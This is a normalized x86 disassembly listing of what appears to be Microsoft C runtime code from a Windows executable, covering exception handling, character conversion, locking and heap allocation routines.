mov edi [ esi + 0x50 ]
add ecx 0xc
and [ ecx + edi - 0x4 ] 0x0
mov edi [ rw-data ]
mov ebx [ rw-data ]
inc edx
add ebx edi
cmp edx ebx
jl r-xdata
mov ebx [ ebp + 0x8 ]
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x58 ] 0x81
jmp r-xdata
push [ esi + 0x58 ]
push 0x8
call ebx
pop ecx
mov [ esi + 0x58 ] edi
pop ecx
pop edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x58 ] 0x84
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi + 0x54 ] eax
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x58 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x58 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x58 ] 0x86
jmp r-xdata
mov [ esi + 0x58 ] 0x8a
sub_404298
mov edx [ esp + 0x8 ]
mov ecx [ rw-data ]
push esi
mov esi [ esp + 0x8 ]
cmp [ edx ] esi
push edi
mov eax edx
je r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
cmp eax ecx
jae r-xdata
lea edi [ ecx + ecx * 2 ]
lea edi [ edx + edi * 4 ]
xor eax eax
cmp [ eax ] esi
je r-xdata
cmp [ eax ] esi
jne r-xdata
pop edi
pop esi
retn
add eax 0xc
cmp eax edi
jae r-xdata
sub_4042d4
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_404316
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push eax
push 0xfffffffe
push sub_4042f4
push [ fs : 0x0 ]
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
cmp esi [ esp + 0x24 ]
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0x8 ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_4043aa
call [ ebx + esi * 4 + 0x8 ]
mov eax [ esp + 0x20 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_4043c4
push esi
inc ebx
xor dh [ eax ]
pop eax
inc ebx
xor [ eax ] dh
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
push ebp
cld
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
push ebp
lea ebp [ ebx + 0x10 ]
push 0xffffffff
push ebx
call sub_404316
add esp 0x8
pop ebp
mov eax 0x1
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov [ ebx - 0x4 ] eax
mov esi [ ebx + 0xc ]
mov edi [ ebx + 0x8 ]
mov eax 0x1
jmp r-xdata
lea ecx [ esi + esi * 2 ]
cmp [ edi + ecx * 4 + 0x4 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebx + 0x8 ]
lea ecx [ esi + esi * 2 ]
mov esi [ edi + ecx * 4 ]
jmp r-xdata
push esi
push ebp
lea ebp [ ebx + 0x10 ]
call [ edi + ecx * 4 + 0x4 ]
pop ebp
pop esi
mov ebx [ ebp + 0xc ]
or eax eax
je r-xdata
cmp esi 0xffffffff
je r-xdata
js r-xdata
mov eax 0x0
jmp r-xdata
mov edi [ ebx + 0x8 ]
push ebx
call sub_4042d4
add esp 0x4
lea ebp [ ebx + 0x10 ]
push esi
push ebx
call sub_404316
add esp 0x8
lea ecx [ esi + esi * 2 ]
push 0x1
mov eax [ edi + ecx * 4 + 0x8 ]
call sub_4043aa
mov eax [ edi + ecx * 4 ]
mov [ ebx + 0xc ] eax
call [ edi + ecx * 4 + 0x8 ]
sub_4044cd
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
cmp [ eax * 4 + rw-data ] 0x0
lea esi [ eax * 4 + rw-data ]
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push edi
push 0x18
call sub_4034c4
mov edi eax
pop ecx
test edi edi
jne r-xdata
push 0x11
call sub_4044cd
cmp [ esi ] 0x0
pop ecx
push edi
jne r-xdata
push 0x11
call sub_40378f
pop ecx
call sub_4033db
pop ecx
call [ InitializeCriticalSection@IAT ]
mov [ esi ] edi
jmp r-xdata
push 0x11
call sub_40452e
pop ecx
pop edi
sub_404543
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
push esi
mov esi rw-data
push edi
push esi
call [ InterlockedIncrement@IAT ]
cmp [ rw-data ] ebx
mov edi [ InterlockedDecrement@IAT ]
je r-xdata
mov eax [ esp + 0x8 ]
cmp eax 0x41
jl r-xdata
push [ esp + 0x10 ]
call sub_4045b2
test ebx ebx
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
push esi
call edi
push 0x13
call sub_4044cd
pop ecx
push 0x1
pop ebx
pop ebx
retn
cmp eax 0x5a
jg r-xdata
push esi
call edi
push 0x13
call sub_40452e
pop ecx
jmp r-xdata
add eax 0x20
pop ebx
retn
mov eax [ esp + 0x10 ]
pop edi
pop esi
sub_4045b2
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
jne r-xdata
mov ebx [ ebp + 0x8 ]
mov edi 0x100
push 0x1
cmp ebx edi
pop esi
jge r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x41
jl r-xdata
mov edx [ rw-data ]
mov eax ebx
sar eax 0x8
movzx ecx al
test [ edx + ecx * 2 + 0x1 ] 0x80
je r-xdata
cmp [ rw-data ] esi
jle r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp eax 0x5a
jg r-xdata
and [ ebp + 0x9 ] 0x0
mov [ ebp + 0x8 ] bl
mov eax esi
and [ ebp + 0xa ] 0x0
push 0x2
mov [ ebp + 0x8 ] al
mov [ ebp + 0x9 ] bl
pop eax
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax esi
push esi
push ebx
call sub_4037d8
pop ecx
pop ecx
jmp r-xdata
add eax 0x20
jmp r-xdata
mov eax ebx
jmp r-xdata
cmp eax esi
jne r-xdata
push esi
push 0x0
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0x8 ]
push eax
push edi
push [ rw-data ]
call sub_4076b5
add esp 0x20
test eax eax
je r-xdata
test eax eax
jne r-xdata
movzx eax [ ebp - 0x3 ]
movzx ecx [ ebp - 0x4 ]
shl eax 0x8
or eax ecx
movzx eax [ ebp - 0x4 ]
jmp r-xdata
sub_40467d
push esi
mov esi [ esp + 0x8 ]
push 0x0
and [ esi ] 0x0
call [ GetModuleHandleA@IAT ]
cmp [ eax ] 0x5a4d
jne r-xdata
pop esi
retn
mov ecx [ eax + 0x3c ]
test ecx ecx
je r-xdata
add eax ecx
mov cl [ eax + 0x1a ]
mov [ esi ] cl
mov al [ eax + 0x1b ]
mov [ esi + 0x1 ] al
sub_4046aa
push ebp
mov ebp esp
mov eax 0x122c
call sub_407b20
lea eax [ ebp - 0x98 ]
push ebx
push eax
mov [ ebp - 0x98 ] 0x94
call [ GetVersionExA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x122c ]
push 0x1090
push eax
push r--data
call [ GetEnvironmentVariableA@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x88 ] 0x2
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
call sub_40467d
cmp [ ebp - 0x4 ] 0x6
pop ecx
sbb eax eax
add eax 0x3
xor ebx ebx
lea ecx [ ebp - 0x122c ]
cmp [ ebp - 0x122c ] bl
je r-xdata
cmp [ ebp - 0x94 ] 0x5
jb r-xdata
lea eax [ ebp - 0x122c ]
push 0x16
push eax
push r--data
call sub_407300
add esp 0xc
test eax eax
jne r-xdata
mov al [ ecx ]
cmp al 0x61
jl r-xdata
push 0x1
pop eax
jmp r-xdata
lea eax [ ebp - 0x19c ]
push 0x104
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
cmp [ ebp - 0x19c ] bl
lea ecx [ ebp - 0x19c ]
je r-xdata
lea eax [ ebp - 0x122c ]
jmp r-xdata
inc ecx
cmp [ ecx ] bl
jne r-xdata
cmp al 0x7a
jg r-xdata
pop ebx
leave
retn
lea eax [ ebp - 0x19c ]
push eax
lea eax [ ebp - 0x122c ]
push eax
call sub_402e20
pop ecx
pop ecx
mov al [ ecx ]
cmp al 0x61
jl r-xdata
cmp eax ebx
je r-xdata
sub al 0x20
mov [ ecx ] al
push 0x2c
push eax
call sub_402d60
pop ecx
cmp eax ebx
pop ecx
je r-xdata
inc ecx
cmp [ ecx ] bl
jne r-xdata
cmp al 0x7a
jg r-xdata
inc eax
mov ecx eax
cmp [ eax ] bl
je r-xdata
sub al 0x20
mov [ ecx ] al
push 0xa
push ebx
push eax
call sub_407904
add esp 0xc
cmp eax 0x2
je r-xdata
cmp [ ecx ] 0x3b
jne r-xdata
cmp eax 0x3
je r-xdata
inc ecx
mov [ ecx ] bl
jmp r-xdata
cmp eax 0x1
je r-xdata
cmp [ ecx ] bl
jne r-xdata
sub_4047f2
xor eax eax
push 0x0
cmp [ esp + 0x8 ] eax
push 0x1000
sete al
push eax
call [ HeapCreate@IAT ]
test eax eax
mov [ rw-data ] eax
je r-xdata
xor eax eax
retn
call sub_4046aa
cmp eax 0x3
mov [ rw-data ] eax
jne r-xdata
cmp eax 0x2
jne r-xdata
push 0x3f8
call sub_40484f
pop ecx
jmp r-xdata
push 0x1
pop eax
retn
call sub_4050a0
test eax eax
jne r-xdata
push [ rw-data ]
call [ HeapDestroy@IAT ]
sub_40484f
push 0x140
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
mov ecx [ esp + 0x4 ]
and [ rw-data ] 0x0
and [ rw-data ] 0x0
push 0x1
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] 0x10
pop eax
retn
retn
sub_404897
mov eax [ rw-data ]
lea ecx [ eax + eax * 4 ]
mov eax [ rw-data ]
lea ecx [ eax + ecx * 4 ]
xor eax eax
mov edx [ esp + 0x4 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
retn
add eax 0x14
jmp r-xdata
cmp eax ecx
jae r-xdata
sub_4048c2
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
mov eax [ ecx + 0x10 ]
push edi
mov edi esi
add esi 0xfffffffc
sub edi [ ecx + 0xc ]
shr edi 0xf
mov ecx edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ esi ]
dec ecx
test cl 0x1
mov [ ebp - 0x4 ] ecx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov edx [ ecx + esi ]
lea ebx [ ecx + esi ]
mov [ ebp - 0xc ] edx
mov edx [ esi - 0x4 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0xc ]
test dl 0x1
mov [ ebp + 0xc ] ebx
jne r-xdata
mov edx ecx
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
mov ebx [ ebp - 0x8 ]
and ebx 0x1
mov [ ebp - 0xc ] ebx
jne r-xdata
push 0x3f
pop edx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
push 0x3f
pop edx
mov ebx [ ebp + 0x8 ]
sub esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
sar ebx 0x4
push 0x3f
mov [ ebp + 0xc ] esi
dec ebx
pop esi
cmp ebx esi
jbe r-xdata
mov ecx [ ebp - 0x4 ]
cmp edx 0x20
jae r-xdata
mov ecx [ ebp - 0x10 ]
mov ebx [ ecx + edx * 8 + 0x4 ]
lea ecx [ ecx + edx * 8 ]
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ecx
mov [ ecx + 0x4 ] esi
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov ecx [ esi + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
cmp ebx edx
je r-xdata
add ecx [ ebp - 0x8 ]
mov edx ecx
mov [ ebp - 0x4 ] ecx
sar edx 0x4
dec edx
cmp edx esi
jbe r-xdata
mov ebx esi
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov [ eax + esi - 0x4 ] eax
mov eax [ ebp - 0x10 ]
dec [ eax ]
jne r-xdata
mov cl [ edx + eax + 0x4 ]
cmp edx 0x20
mov [ ebp + 0xf ] cl
inc cl
mov [ edx + eax + 0x4 ] cl
jae r-xdata
cmp ebx edx
je r-xdata
mov edx esi
mov ecx [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov esi [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov edx [ ebx + 0x8 ]
mov ebx [ ebx + 0x4 ]
add ecx [ ebp - 0xc ]
mov [ edx + 0x4 ] ebx
mov edx [ ebp + 0xc ]
mov [ ebp - 0x4 ] ecx
mov ebx [ edx + 0x4 ]
mov edx [ edx + 0x8 ]
mov [ ebx + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ rw-data ] edi
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov esi [ VirtualFree@IAT ]
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push 0x4000
push ebx
push ecx
call esi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov eax [ eax + 0x10 ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edx - 0x20 ]
mov edx 0x80000000
shr edx cl
lea eax [ eax + edi * 4 + 0xc4 ]
or [ eax ] edx
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea eax [ eax + edi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ebx 0x80000000
mov ecx edx
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ esi + 0x8 ] ecx
cmp ebx 0x20
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
lea ecx [ ebx - 0x20 ]
mov esi 0x80000000
shr esi cl
not esi
and [ eax + edi * 4 + 0xc4 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
mov esi 0x80000000
mov ecx ebx
shr esi cl
not esi
and [ eax + edi * 4 + 0x44 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call esi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov eax [ rw-data ]
mov edx [ rw-data ]
lea eax [ eax + eax * 4 ]
shl eax 0x2
mov ecx eax
mov eax [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_406df0
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
and [ ecx ] esi
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
sub [ ebp + 0x8 ] 0x14
sub_404beb
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov edx [ rw-data ]
push ebx
push esi
lea eax [ eax + eax * 4 ]
push edi
lea edi [ edx + eax * 4 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
lea ecx [ eax + 0x17 ]
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
dec ecx
cmp ecx 0x20
jge r-xdata
add ecx 0xffffffe0
or eax 0xffffffff
xor esi esi
shr eax cl
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] eax
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
cmp ebx [ ebp - 0x4 ]
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov eax [ rw-data ]
mov ebx eax
cmp ebx edi
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
cmp edx 0xffffffff
mov [ ebp - 0x4 ] edx
je r-xdata
mov ebx edx
add ebx 0x14
cmp ebx [ ebp - 0x4 ]
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov edx [ eax + 0xc4 ]
mov esi [ eax + 0x44 ]
and edx [ ebp - 0x8 ]
and esi [ ebp - 0xc ]
and [ ebp - 0x4 ] 0x0
lea ecx [ eax + 0x44 ]
or edx esi
mov esi [ ebp - 0xc ]
jne r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
inc [ ebp - 0x4 ]
and edx [ ebp - 0x8 ]
add ecx 0x4
mov edi esi
and edi [ ecx ]
or edx edi
je r-xdata
mov ecx edx
xor edi edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
and ecx esi
jne r-xdata
cmp ebx [ ebp - 0x4 ]
jae r-xdata
cmp ebx eax
add ebx 0x14
jmp r-xdata
test ecx ecx
jl r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
push 0x20
and ecx [ ebp - 0x8 ]
pop edi
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
mov [ ebp - 0x8 ] ecx
sar esi 0x4
dec esi
cmp esi 0x3f
jle r-xdata
shl ecx 0x1
inc edi
jmp r-xdata
push ebx
call sub_404fa5
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
jne r-xdata
mov ebx edx
cmp ebx [ ebp - 0x4 ]
add ebx 0x14
mov [ ebp + 0x8 ] ebx
jmp r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
xor eax eax
jmp r-xdata
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_404ef4
mov ebx eax
test ebx ebx
mov [ ebp + 0x8 ] ebx
je r-xdata
cmp ebx eax
add ebx 0x14
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
test ecx ecx
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
cmp [ ebp - 0x8 ] 0x0
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
jge r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov edi [ ecx + esi * 8 + 0x4 ]
lea ecx [ ecx + esi * 8 ]
mov [ edx + 0x4 ] edi
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
cmp esi 0x20
mov [ ebp + 0xb ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx ] ecx
jmp r-xdata
and [ rw-data ] 0x0
inc cl
cmp [ ebp + 0xb ] 0x0
mov [ esi + eax + 0x4 ] cl
jne r-xdata
inc cl
cmp [ ebp + 0xb ] 0x0
mov [ esi + eax + 0x4 ] cl
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov edi 0x80000000
mov ecx esi
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_404ef4
mov eax [ rw-data ]
mov ecx [ rw-data ]
push esi
push edi
xor edi edi
cmp eax ecx
jne r-xdata
mov ecx [ rw-data ]
push 0x41c4
push 0x8
lea eax [ eax + eax * 4 ]
push [ rw-data ]
lea esi [ ecx + eax * 4 ]
call [ HeapAlloc@IAT ]
cmp eax edi
mov [ esi + 0x10 ] eax
je r-xdata
lea eax [ ecx + ecx * 4 + 0x50 ]
shl eax 0x2
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
cmp eax edi
mov [ esi + 0xc ] eax
jne r-xdata
add [ rw-data ] 0x10
mov [ rw-data ] eax
mov eax [ rw-data ]
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
sub_404fa5
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
push ebx
push esi
push edi
mov esi [ ecx + 0x10 ]
mov eax [ ecx + 0x8 ]
xor ebx ebx
mov eax ebx
push 0x3f
imul eax eax 0x204
pop edx
lea eax [ eax + esi + 0x144 ]
mov [ ebp - 0x4 ] eax
shl eax 0x1
inc ebx
jmp r-xdata
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
mov edi ebx
push 0x4
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x1000
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
test eax eax
jl r-xdata
lea edx [ edi + 0x7000 ]
cmp edi edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x4 ]
lea ecx [ edi + 0xc ]
add eax 0x1f8
push 0x1
pop edi
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
lea eax [ edi + 0x10 ]
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea ecx [ eax + 0xffc ]
mov [ eax - 0x4 ] 0xff0
mov [ eax ] ecx
lea ecx [ eax - 0x1004 ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
lea ecx [ eax - 0x10 ]
cmp ecx edx
jbe r-xdata
sub_4050a0
cmp [ rw-data ] 0xffffffff
push ebx
push ebp
push esi
push edi
jne r-xdata
push 0x2020
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov esi eax
test esi esi
je r-xdata
mov esi rw-data
jmp r-xdata
xor eax eax
mov ebp [ VirtualAlloc@IAT ]
push 0x4
push 0x2000
push __dos_header
push 0x0
call ebp
mov edi eax
test edi edi
je r-xdata
cmp esi rw-data
je r-xdata
push 0x4
mov ebx 0x10000
push 0x1000
push ebx
push edi
call ebp
test eax eax
je r-xdata
push esi
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
push 0x8000
push 0x0
push edi
call [ VirtualFree@IAT ]
mov eax rw-data
cmp esi eax
jne r-xdata
mov [ esi ] eax
mov eax [ rw-data ]
mov [ esi + 0x4 ] eax
mov [ rw-data ] esi
mov eax [ esi + 0x4 ]
mov [ eax ] esi
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
cmp ebp 0x10
setge dl
dec edx
and edx ecx
dec edx
inc ebp
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
add eax 0x8
cmp ebp 0x400
jl r-xdata
push ebx
push 0x0
push edi
call sub_406d90
add esp 0xc
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] eax
mov eax esi
jmp r-xdata
or [ edi + 0xf8 ] 0xff
lea eax [ edi + 0x8 ]
mov [ edi ] eax
mov [ edi + 0x4 ] 0xf0
add edi 0x1000
jmp r-xdata
lea eax [ edi + __dos_header ]
lea ecx [ esi + 0x98 ]
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x18 ]
mov [ esi + 0xc ] ecx
mov [ esi + 0x10 ] edi
mov [ esi + 0x8 ] eax
xor ebp ebp
mov ecx 0xf1
mov [ rw-data ] eax
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ esi + 0x10 ]
add eax ebx
cmp edi eax
jae r-xdata
sub_4051e4
push esi
